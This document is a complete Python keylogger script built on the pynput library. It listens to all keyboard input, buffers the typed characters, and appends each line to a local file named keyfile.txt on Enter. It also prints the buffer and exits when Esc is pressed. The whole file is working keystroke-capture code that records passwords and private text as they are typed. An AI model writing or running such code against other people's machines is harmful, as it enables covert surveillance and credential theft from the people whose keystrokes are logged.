from pynput.keyboard import Key, Listener, HotKey

special_keys = {
    Key.enter: '\n',
    Key.tab: '\t',
    Key.space: ' '
}   
buffer = []

def on_press(key) -> bool:
    try:
        if hasattr(key, 'char') and key.char:
           buffer.append(key.char)
        elif key in special_keys.keys():
            buffer.append(special_keys.get(key))
        elif key == Key.backspace or key == Key.delete:
            buffer.pop()
    except AttributeError as e:
        print(f"AttributeError: {e}")

def on_release(key) -> bool:
    try: 
        if key == Key.enter:
            with open("keyfile.txt",'a',encoding="utf-8") as log:
                for char in buffer:
                    log.write(char)
                print(buffer)
                buffer.clear()
    except Exception:
        pass
    
    if key == Key.esc:
        return False   

def main():
    with Listener(on_press=on_press,on_release=on_release) as listener:
        listener.join()
        
if __name__ == "__main__":
    main()